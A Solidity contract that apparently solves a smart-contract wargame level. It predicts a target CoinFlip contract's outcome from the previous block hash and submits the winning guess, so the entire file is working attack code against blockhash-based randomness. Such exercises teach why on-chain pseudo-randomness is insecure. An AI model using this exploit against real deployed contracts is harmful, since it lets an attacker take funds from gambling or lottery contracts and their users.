// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {

    function flip(bool _guess) external returns (bool);

}

contract CoinFlipAttack {

    CoinFlip public coinFlip;   
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address coinFlipAddress) {
        coinFlip = CoinFlip(coinFlipAddress);
    }

    function attack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 result = blockValue / FACTOR;
        bool side = result == 1 ? true : false;
        return coinFlip.flip(side);
    }
}